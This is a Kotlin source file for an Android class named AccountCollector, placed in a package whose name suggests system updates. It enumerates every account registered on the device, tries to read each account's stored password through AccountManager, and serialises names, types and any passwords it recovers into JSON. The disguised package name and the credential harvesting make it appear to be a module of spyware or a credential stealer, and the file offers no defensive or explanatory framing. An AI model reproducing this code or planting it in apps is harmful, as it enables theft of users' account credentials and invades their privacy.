package com.system.updates.modules.data

import android.accounts.Account
import android.accounts.AccountManager
import android.content.Context
import android.util.Log
import org.json.JSONArray
import org.json.JSONObject
import java.security.AccessControlException

class AccountCollector(private val context: Context) {

    private val TAG = "AccountCollector"
    private val accountManager = AccountManager.get(context)

    fun collectAccounts(): List<Map<String, String>> {
        Log.i(TAG, "Collecting registered accounts...")
        val accounts = accountManager.accounts
        val accountList = mutableListOf<Map<String, String>>()

        for (account in accounts) {
            val accountData = mutableMapOf<String, String>()
            accountData["name"] = account.name
            accountData["type"] = account.type

            // Attempt to get password (requires additional permissions, may fail)
            try {
                val password = accountManager.getPassword(account)
                if (password != null) {
                    accountData["password"] = password
                }
            } catch (e: SecurityException) {
                Log.w(TAG, "Cannot access password for ${account.name}: ${e.message}")
            } catch (e: AccessControlException) {
                Log.w(TAG, "Access control exception for ${account.name}")
            }

            accountList.add(accountData)
            Log.i(TAG, "Found account: ${account.name} (${account.type})")
        }
        return accountList
    }

    fun collectAccountsAsJson(): String {
        val list = collectAccounts()
        val jsonArray = JSONArray()
        for (item in list) {
            val obj = JSONObject(item)
            jsonArray.put(obj)
        }
        return jsonArray.toString()
    }
}